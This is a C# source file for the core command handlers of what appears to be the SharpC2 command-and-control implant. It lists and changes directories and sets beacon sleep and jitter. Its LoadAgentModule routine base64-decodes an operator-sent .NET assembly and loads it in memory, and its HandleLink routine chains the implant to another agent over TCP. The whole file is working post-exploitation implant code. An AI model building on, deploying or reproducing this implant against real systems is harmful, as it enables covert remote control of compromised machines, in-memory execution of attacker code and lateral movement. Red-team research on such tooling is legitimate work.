using System;
using System.IO;
using System.Reflection;

using Agent.Models;
using Agent.Common;
using Agent.Interfaces;
using Agent.Controllers;

namespace Agent.Commands
{
    public class Core
    {
        public static string ListDirectory(string Path)
        {
            var results = new SharpC2ResultList<FileSystemEntryResult>();

            try
            {
                foreach (string dir in Directory.GetDirectories(Path))
                {
                    var dirInfo = new DirectoryInfo(dir);
                    results.Add(new FileSystemEntryResult
                    {
                        Name = dirInfo.FullName,
                        Length = 0,
                        CreationTimeUtc = dirInfo.CreationTimeUtc,
                        LastAccessTimeUtc = dirInfo.LastAccessTimeUtc,
                        LastWriteTimeUtc = dirInfo.LastWriteTimeUtc
                    });
                }
                foreach (string file in Directory.GetFiles(Path))
                {
                    var fileInfo = new FileInfo(file);
                    results.Add(new FileSystemEntryResult
                    {
                        Name = fileInfo.FullName,
                        Length = fileInfo.Length,
                        CreationTimeUtc = fileInfo.CreationTimeUtc,
                        LastAccessTimeUtc = fileInfo.LastAccessTimeUtc,
                        LastWriteTimeUtc = fileInfo.LastWriteTimeUtc
                    });
                }
            }
            catch (Exception e)
            {
                return e.StackTrace;
            }

            return results.ToString();
        }

        public static string ChangeDirectory(string Path)
        {
            string result;

            try
            {
                Directory.SetCurrentDirectory(Path);
                result = Directory.GetCurrentDirectory();
            }
            catch (Exception e)
            {
                result = e.StackTrace;
            }

            return result;
        }

        public static string PrintWorkingDirectory()
        {
            string result;

            try
            {
                result = Directory.GetCurrentDirectory();
            }
            catch (Exception e)
            {
                result = e.StackTrace;
            }

            return result;
        }

        public static string SetSleep(string Sleep, ConfigController config)
        {
            string result;

            try
            {
                if (string.IsNullOrEmpty(Sleep))
                {
                    result = string.Format("sleep: {0} jitter: {1}", config.GetOption(ConfigurationSettings.SleepTime), config.GetOption(ConfigurationSettings.Jitter));
                    return result;
                }

                var cfg = Sleep.Split(' ');

                if (int.TryParse(cfg[0], out int sleep) && int.TryParse(cfg[1], out int jitter))
                {
                    config.SetOption(ConfigurationSettings.SleepTime, sleep);
                    config.SetOption(ConfigurationSettings.Jitter, jitter);
                }
                else
                {
                    result = "Provided values are not of type int";
                    return result;
                }

                result = string.Format("sleep: {0} jitter: {1}", config.GetOption(ConfigurationSettings.SleepTime), config.GetOption(ConfigurationSettings.Jitter));
            }
            catch (Exception e)
            {
                result = e.StackTrace;
            }

            return result;
        }

        public static void LoadAgentModule(string Data, AgentController agent, ConfigController config)
        {
            var assembly = Assembly.Load(Helpers.Base64Decode(Data));
            var module = assembly.CreateInstance("Agent.AgentModule", true);

            if (module is IAgentModule == false)
            {
                agent.SendError("core", "loadmodule", "Assembly is not of type IAgentModule");
                return;
            }

            var agentModule = module as IAgentModule;
            agentModule.Initialise(agent, config);
        }

        public static void HandleLink(string Data, AgentController agent)
        {
            var split = Data.Split(' ');
            agent.LinkTCPAgent(split[0], int.Parse(split[1]));
        }
    }
}